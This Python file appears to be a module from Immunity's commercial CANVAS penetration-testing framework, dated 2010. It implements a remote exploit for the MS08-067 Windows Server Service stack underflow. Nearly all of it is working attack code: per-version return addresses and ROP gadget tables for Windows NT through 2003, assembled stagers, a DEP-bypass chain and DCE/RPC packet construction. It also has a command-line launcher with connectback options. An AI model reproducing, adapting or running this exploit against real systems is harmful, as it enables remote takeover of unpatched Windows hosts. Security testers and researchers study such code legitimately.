#!/usr/bin/env python
##ImmunityHeader v1 
###############################################################################
## File       :  ms08_067.py
## Description:  
##            :  
## Created_On :  Thu Aug 26 09:06:42 2010
## Created_By :  Kostya Kortchinsky
## Modified_On:  Thu Aug 26 09:11:53 2010
## Modified_By:  Kostya Kortchinsky
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################

import sys
if '.' not in sys.path: sys.path.append('.')
import canvasengine

from exploitutils import *
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from msrpcexploit import msrpcexploit
from libs.newsmb.libdcerpc import s_dce_raw_unistring, s_dce_win2k_unistring
from libs.dcemarshall import *


# GUI info
NAME='Windows Server Service Underflow (MS08-067)'
DESCRIPTION='Windows Server Service CanonicalizePathName() Stack Underflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='10/23/2008'
DOCUMENTATION['CVE Name']='CVE-2008-4250'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['CVS URL']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS08-067.mspx'
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['Notes']='If you need some localized version of Windows XP or 2003 added to the list, send support@immunityinc.com a msvcrt.dll of this version!'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']
PROPERTY['MSADV']='MS08-067'

CHANGELOG="""
"""

NOTES="""
"""

targets={
    0: ['Autoversioning',0x0,[],0x0],
    1: ['Windows NT 4.0 SP6a',0x0,[0x002b5028],0x474], #jmp esp @ sortkey.nls
    2: ['Windows 2000 SP0-SP4',0x0,[0x00187a23],0x494], #jmp edi @ unicode.nls
    3: ['Windows XP SP0-SP1a',0x0,[0x01001361],0x498], #call esi @ svchost.exe
    4: ['Windows XP SP2-SP3 English',0x77c10000,[0x1a2f3,0x13d0b,0x21a98,0x1e77d,0x4f334,0xc1eb,0x36784,0x126dd],0x460],
    5: ['Windows XP SP2-SP3 French,German,Simplified+Chinese,Spanish,Traditional+Chinese',0x77be0000,[0x1a2f3,0x13d0b,0x21a98,0x1e77d,0x4f334,0xc1eb,0x36784,0x126dd],0x460],
    6: ['Windows XP SP2-SP3 Hebrew',0x77bb0000,[0x1a2f3,0x13d0b,0x21a98,0x1e77d,0x4f334,0xc1eb,0x36784,0x126dd],0x460],
    7: ['Windows XP SP2-SP3 Arabic',0x77ba0000,[0x1a2f3,0x13d0b,0x21a98,0x1e77d,0x4f334,0xc1eb,0x36784,0x126dd],0x460],
    8: ['Windows XP SP2-SP3 Japanese,Korean',0x77bc0000,[0x1a2f3,0x13d0b,0x21a98,0x1e77d,0x4f334,0xc1eb,0x36784,0x126dd],0x460],
    9: ['Windows XP SP2-SP3 Czech',0x77c00000,[0x1a2f3,0x13d0b,0x21a98,0x1e77d,0x4f334,0xc1eb,0x36784,0x126dd],0x460],
    10: ['Windows 2003 SP0',0x0,[0x0100129e],0x49c], #call esi @ svchost.exe
    11: ['Windows 2003 SP1-SP2 English',0x77ba0000,[0x1ae84,0x14837,0x229d1,0x1f59e,0x51354,0xc637,0x375f4,0x1320a],0x460],
    12: ['Windows 2003 SP1-SP2 French,German,Spanish',0x77b70000,[0x1ae84,0x14837,0x229d1,0x1f59e,0x51354,0xc637,0x375f4,0x1320a],0x460],
    13: ['Windows 2003 SP1-SP2 Japanese',0x77b40000,[0x1ae84,0x14837,0x229d1,0x1f59e,0x51354,0xc637,0x375f4,0x1320a],0x460],
    14: ['Windows 2003 SP1-SP2 Czech',0x77b90000,[0x1ae84,0x14837,0x229d1,0x1f59e,0x51354,0xc637,0x375f4,0x1320a],0x460]
}


class theexploit(msrpcexploit):

    def __init__(self):
        msrpcexploit.__init__(self)
        self.name                = NAME
        self.version             = 0
        self.badstring           = '\0\xff'
        self.searchbadstring     = '\0'
        self.UUID                = u'4b324fc8-1670-01d3-1278-5a47bf6ee188'
        self.uuidversion         = u'3.0'
        self.targetfunction      = 0x1f
        self.autoversion         = 1
        self.subesp              = 1000
        self.sleeptime           = 4
        self.port                = 445
        self.namedpipe           = '\\browser'
        self.buildConnectionList = self.buildTCPConnectionList
        self.setSubVersions() #automatically sets some variables for some common versions/languages
        self.use_universal       = True 

    def setSubVersions(self):
        self.deptargets=[]
        self.langdictXP={}
        self.langdict2003={}
        for v in targets:
            d=targets[v]
            if d[0].count('XP SP2')>0:
                self.deptargets.append(v)
                l=d[0].split(' ')[-1]
                for s in l.split(','):
                    s=s.replace('+',' ')
                    self.langdictXP[s]=v
            elif d[0].count('2003 SP1')>0:
                self.deptargets.append(v)
                l=d[0].split(' ')[-1]
                for s in l.split(','):
                    s=s.replace('+',' ')
                    self.langdict2003[s]=v
            elif d[0].count('2000')>0:
                self.WIN2000=v
            elif d[0].count('XP SP0')>0:
                self.WINXP=v
            elif d[0].count('2003 SP0')>0:
                self.WIN2003=v
            elif d[0].count('NT 4.0')>0:
                self.WINNT4=v
        return

    def testOS(self):
        if self.version!=0:
            self.log('TestOS running with version %d?!?'%self.version)            
        self.version=0
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)

        if app.run()==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        myos=app.result
        self.log('OS Found: %s'%(myos))
        if not myos.language:
            self.log('No language found, defaulting to engine\'s non-language option %s'%(self.engine.osdetect_mode))
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NO_RUN:
                self.log('Not running, could not find language')
                return 0
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_ONE_LANG:
                self.log('Assuming language %s'%(self.engine.osdetect_lang))
                myos.language=self.engine.osdetect_lang
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NEAREST_NEIGHBOR:
                self.log('Nearest neighbor algorithm not yet implemented')
                return 0
        if myos.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        if myos.version=='NT':
            self.version=self.WINNT4
            return 1
        elif myos.version=='2000':
            self.version=self.WIN2000
            return 1
        elif myos.version=='XP':
            if 'SP0' in myos.servicepack or 'SP1' in myos.servicepack:
                self.version=self.WINXP
                return 1
            else:
                self.log('Attacking Windows XP SP2-SP3 language: %s'%(myos.language))
                if myos.language in self.langdictXP.keys():
                    self.version=self.langdictXP[myos.language]
                    return 1
                else:
                    return 0
        elif myos.version=='2003':
            if 'SP0' in myos.servicepack:
                self.version=self.WIN2003
            else:
                self.log('Attacking Windows 2003 SP1-SP2 language: %s'%(myos.language))
                if myos.language in self.langdict2003.keys():
                    self.version=self.langdict2003[myos.language]
                    return 1
                else:
                    return 0
            return 1
        else:
            self.log('OS not vulnerable: %s'%(myos))
        return 0
    
    def buildDcePacket(self):
        self.log('Using version %d'%(self.version))
        self.info,self.base,eip,self.distance=targets[self.version]
        self.eip=[]
        for i in range(len(eip)):
            self.eip+=[eip[i]]
        self.log('Attacking %s'%(self.info))
        data=''
        payload=''
        payload+=u'A\\..\\..\\'.encode('utf-16le')
        mark=len(payload)

        if self.version==self.WINNT4: #Windows NT 4.0
            stager2k="""movl %%esp,%%eax
addw $0x%x,%%ax
movl (%%eax),%%eax
jmp %%eax"""%(self.distance)
            stager=mosdef.assemble(stager2k,'x86')
            payload+=struct.pack('<L',self.eip[0])
            payload+='BBBB'
            payload+=stager
            payload+='C'*(0x4a-(len(payload)-mark))

        elif self.version==self.WIN2000 or self.version==self.WINXP: #Windows 2000 or Windows XP SP0-SP1a
            stager2k="""movl %%esp,%%eax
addw $0x%x,%%ax
movl (%%eax),%%eax
jmp %%eax"""%(self.distance)
            stager=mosdef.assemble(stager2k,'x86')
            payload+='A'*0x12
            payload+=struct.pack('<L',self.eip[0])
            payload+=stager
            payload+='C'*(0x48-(len(payload)-mark))
            payload+='\xeb\xcc'

        elif self.version==self.WIN2003: #Windows 2003 SP0
            stager2k="""movl %%esp,%%eax
addw $0x%x,%%ax
movl (%%eax),%%eax
jmp %%eax"""%(self.distance)
            stager=mosdef.assemble(stager2k,'x86')
            payload+='AA'
            payload+=struct.pack('<L',self.eip[0])
            payload+='C'*0x32
            payload+=stager
            payload+='D'*(0x4a-(len(payload)-mark))
            
        elif self.version in self.deptargets: #Windows XP SP2-SP3, or Windows 2003 SP1-SP2
            for i in range(len(self.eip)):
                self.eip[i]+=self.base
            stagerXp="""movl %%esp,%%eax
addw $0x%x,%%ax
movl 0x0(%%eax),%%eax
pushl %%eax
call %%esi
jmp %%eax"""%(self.distance) #__wcsdup
            stager=mosdef.assemble(stagerXp,'x86')
            if len(stager)>0x0e:
                raise Exception,'Somebody messed up something in MOSDEF, cannot continue' #HI DAVE!!!
            #This is based on a Nicolas P. idea
            payload+=struct.pack('<L',self.eip[7]) #call eax
            payload+=stager
            payload+='B'*(0x12-(len(payload)-mark))
            payload+=struct.pack('<LLLL',self.eip[0],0xffffffff,0x00010001,0x00010001) #HeapCreate
            payload+='C'*4 #discarded
            payload+=struct.pack('<LL',self.eip[1],0xfffffff5)
            payload+=struct.pack('<L',self.eip[2])
            payload+=struct.pack('<L',self.eip[6]) #__wcsdup
            payload+='D'*4 #discarded
            payload+=struct.pack('<L',self.eip[3])
            payload+=struct.pack('<L',self.eip[4])
            payload+=struct.pack('<L',self.eip[5])
            payload+=struct.pack('<L',self.eip[6]+5) #__wcsdup+5

        payload+='\0\0'
        data+=struct.pack('<L',0x00000001)
        if len(self.shellcode)%2!=0:
            self.shellcode+='A'
        data+=s_dce_raw_unistring(self.shellcode+'A'*64+'\0\0')
        data+=s_dce_raw_unistring(payload)
        data+=struct.pack('<L',0x00000002)
        data+=s_dce_win2k_unistring('\\')
        data+=struct.pack('<LL',1,1)
        return data

    def usage(self):
        print 'Usage: %s -v version -t host -l localIP -d localPort (connectback) [ -p port -T (toggle test mode) ]'% sys.argv[0]
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'% (i,listline[0].replace('+',' '))
            i=i+1
        
    
if __name__=='__main__':    
    app=theexploit()    
    ret=standard_callback_commandline(app)
    
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
    elif ret not in [0,1,None]:
        print 'Weird return value: %s'%(ret)
